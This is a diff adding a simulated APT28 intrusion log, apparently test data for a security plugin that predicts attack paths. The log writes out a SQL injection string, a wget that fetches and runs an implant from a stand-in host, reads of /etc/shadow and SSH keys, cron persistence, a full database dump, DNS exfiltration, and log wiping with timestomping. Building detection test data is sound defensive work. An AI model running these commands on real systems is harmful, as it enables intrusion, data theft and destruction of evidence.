@@ -1,0 +1,41 @@
+# ══════════════════════════════════════════════════════════════════
+# SIMULATED LOG — APT28 (Fancy Bear / Sofacy / Sednit)
+# Scenario: Exploit → Obfuscation → Discovery → Lateral → Exfil
+# For testing PredictiveAttackPath plugin
+# ══════════════════════════════════════════════════════════════════
+
+[2025-07-22T14:10:00Z] WAF web-app-01: Blocked SQL injection attempt from 203.0.113.42
+    URI: /api/v2/search?q=' UNION SELECT username,password FROM users--
+    Rule: SQL-INJECTION-001  Action: BLOCK
+[2025-07-22T14:10:05Z] WAF web-app-01: CVE-2024-XXXX exploit attempt from 203.0.113.42 against /api/v2/upload
+    Payload: deserialization attack — remote code execution attempt
+[2025-07-22T14:10:06Z] WAF web-app-01: ALLOW — new variant bypassed signature
+[2025-07-22T14:10:07Z] APP-SRV-01 apache access.log: 203.0.113.42 POST /api/v2/upload 200 1337
+[2025-07-22T14:10:10Z] APP-SRV-01 auditd: execve="/bin/bash" "-c" "id; uname -a; cat /etc/os-release"
+[2025-07-22T14:10:12Z] APP-SRV-01 auditd: execve="/bin/bash" "-c" "wget http://203.0.113.42:8080/implant -O /tmp/.cache_update"
+[2025-07-22T14:10:15Z] APP-SRV-01 auditd: execve="/bin/chmod" "+x" "/tmp/.cache_update"
+[2025-07-22T14:10:16Z] APP-SRV-01 auditd: execve="/tmp/.cache_update" (ELF binary, packed with UPX, high entropy sections detected)
+[2025-07-22T14:10:20Z] APP-SRV-01 DNS: query TXT record for c2.update-service-cdn.example.net (dns tunnel suspected)
+[2025-07-22T14:10:25Z] APP-SRV-01 auditd: execve="/bin/cat" "/etc/passwd"
+[2025-07-22T14:10:26Z] APP-SRV-01 auditd: execve="/bin/cat" "/etc/shadow"
+[2025-07-22T14:10:30Z] APP-SRV-01 auditd: execve="/usr/bin/find" "/" "-name" "id_rsa" "-type" "f"
+[2025-07-22T14:10:35Z] APP-SRV-01 auditd: execve="/usr/bin/find" "/" "-name" "*.pem" "-type" "f"
+[2025-07-22T14:10:40Z] APP-SRV-01 auditd: execve="/usr/bin/ss" "-tlnp"
+[2025-07-22T14:10:42Z] APP-SRV-01 auditd: execve="/usr/bin/ip" "addr" "show"
+[2025-07-22T14:10:45Z] APP-SRV-01 auditd: execve="/usr/bin/ps" "aux"
+[2025-07-22T14:11:00Z] APP-SRV-01 auditd: file_write path="/etc/cron.d/system-update" content="*/15 * * * * root /tmp/.cache_update --daemon"
+[2025-07-22T14:11:05Z] APP-SRV-01 auditd: file_write path="/home/www-data/.bashrc" append="export PATH=/tmp:$PATH"
+[2025-07-22T14:11:30Z] APP-SRV-01 auditd: execve="/usr/bin/ssh" "-i" "/home/www-data/.ssh/id_rsa" "admin@db-srv-01.internal"
+[2025-07-22T14:11:35Z] DB-SRV-01 sshd[4521]: Accepted publickey for admin from 10.10.5.12 port 48832
+[2025-07-22T14:12:00Z] DB-SRV-01 auditd: execve="/bin/bash" "-c" "cat /etc/passwd; id; hostname"
+[2025-07-22T14:12:10Z] DB-SRV-01 auditd: execve="/usr/bin/mysqldump" "--all-databases" "--result-file=/tmp/full_dump.sql"
+[2025-07-22T14:12:30Z] DB-SRV-01 auditd: execve="/usr/bin/tar" "czf" "/tmp/db_export.tar.gz" "/tmp/full_dump.sql" "/var/lib/mysql/sensitive_data/"
+[2025-07-22T14:13:00Z] DB-SRV-01 auditd: execve="/usr/bin/scp" "/tmp/db_export.tar.gz" "www-data@app-srv-01:/tmp/.db_cache"
+[2025-07-22T14:14:00Z] APP-SRV-01 auditd: DNS query: exfil.update-service-cdn.example.net TXT (dns exfiltration - chunked base64 data in DNS queries)
+[2025-07-22T14:14:01Z] APP-SRV-01 auditd: DNS query: chunk001.exfil.update-service-cdn.example.net TXT
+[2025-07-22T14:14:02Z] APP-SRV-01 auditd: DNS query: chunk002.exfil.update-service-cdn.example.net TXT
+[2025-07-22T14:14:03Z] APP-SRV-01 auditd: DNS query: chunk003.exfil.update-service-cdn.example.net TXT
+[2025-07-22T14:15:00Z] APP-SRV-01 auditd: execve="/bin/bash" "-c" "history -c; unset HISTFILE; export HISTSIZE=0"
+[2025-07-22T14:15:05Z] APP-SRV-01 auditd: execve="/bin/rm" "-rf" "/tmp/.cache_update" "/tmp/.db_cache"
+[2025-07-22T14:15:10Z] APP-SRV-01 auditd: execve="/bin/bash" "-c" "truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/apache2/access.log"
+[2025-07-22T14:15:15Z] APP-SRV-01 auditd: execve="/usr/bin/touch" "-t" "202507010000.00" "/var/log/auth.log" (timestomp detected)
